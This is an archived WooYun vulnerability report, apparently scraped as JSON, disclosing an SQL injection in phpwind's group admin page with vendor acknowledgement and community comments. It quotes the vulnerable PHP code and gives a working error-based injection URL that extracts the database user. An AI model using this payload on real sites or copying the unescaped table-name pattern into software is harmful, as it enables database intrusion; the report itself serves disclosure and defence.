{"id": 23126, "wybug_id": "wooyun-2011-01549", "wybug_title": "phpwind一个SQL注射漏洞", "wybug_corp": "phpwind", "wybug_author": "t00000by57", "wybug_date": "2011-03-10 19:37", "wybug_open_date": "2011-04-09 21:00", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-03-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2011-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-04-09：\t细节向公众公开  简要描述： 小bug而已 利用前提是得到群组管理员权限 详细说明：  /apps/group/admin/manage.php line 219\nS::gp(array('ttable', 'ptable', 'page','cid','author','ckauthor','keyword','ktype','ttype','ckkeyword','postdate_s','postdate_e','orderby','sc','perpage','cname')); //ttable\t\t.....\t\tif ($ttype == '1') {\t\t\t$sqltab = 'pw_threads t';\t\t\t$pw_tmsgs = 'pw_tmsgs' . $ttable; //!\t\t\t$tpre = 'tm';\t\t\t$addpage .= \"ttable=$ttable&\";\t\t} else {\t\t\t$sqltab = GetPtable($ptable) . ' t';\t\t\t$addpage .= \"ttype=2&ptable=$ptable&\";\t\t}          ......\t\tif ($keyword) {\t\t\t$addpage .= \"keyword=$keyword&ktype=$ktype&ckkeyword=$ckkeyword&\";\t\t\tif ($ckkeyword) {\t\t\t\t$k_sql = \" = \" . S::sqlEscape($keyword);\t\t\t} else {\t\t\t\t$k_sql = \" LIKE \" . S::sqlEscape('%'.$keyword.'%');\t\t\t}\t\t\tif ($ktype == 'subject') {\t\t\t\t$sql .= \" AND t.subject\" . $k_sql;\t\t\t} else {\t\t\t\t$ttype == '1' && $sqltab .= \" LEFT JOIN $pw_tmsgs tm ON t.tid=tm.tid\"; //$pw_tmsgs\t\t\t\t$sql .= \" AND {$tpre}.content\" . $k_sql;\t\t\t}\t\t}\n   漏洞证明：  /admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid=a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),CONCAT(0x3a,(SELECT USER())))a from information_schema.tables group by a)b)%23\n\n   修复方案：  preg_match也可不修补   版权声明：转载请注明来源 t00000by57@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2011-03-11 16:23 厂商回复： 谢谢 t00000by57 反馈，我们会尽快处理的。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-03-11 17:16 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  修复之后 注明是t00000by57在wooyun提交的哇，附上原始连接~~~~~谢谢！    \n     2011-03-12 00:28 |    \t\tpg5yl8 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:12        | 我神马都不会 但我常常被人日 这是为神马呢)\t\t \n  修复之后 注明是t00000by57在wooyun提交的哇，附上原始连接~~~~~谢谢！    \n     2011-03-12 01:25 |    \t\tsaga \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 世界上只有10种人，懂二进制的，和不懂二进...)\t\t \n  关注中    \n     2011-04-09 21:51 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  修复之后 注明是t00000by57在wooyun提交的哇，附上原始连接~~~~~谢谢！    \n     2011-04-09 22:59 |    \t\t0x0F \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:60        | 尖刀安全 (JDSec.Com).......................)\t\t \n  修复之后 注明是t00000by57在wooyun提交的哇，附上原始连接~~~~~谢谢！    \n     2011-04-20 12:30 |    \t\t龍 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:20        | 关注网络安全,关注漏洞研究)\t\t \n  修复之后 注明是t00000by57在wooyun提交的哇，附上原始连接~~~~~谢谢！????????    \n     2012-05-10 01:50 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser = = 时刻不忘做广告啊！    \n     2012-07-30 17:59 |    \t\tCCOz \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:7        | 本人还是处，有意的富婆请联系我，五万以下...)\t\t \n  修复之后 注明是t00000by57在wooyun提交的哇，附上原始连接~~~~~谢谢！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}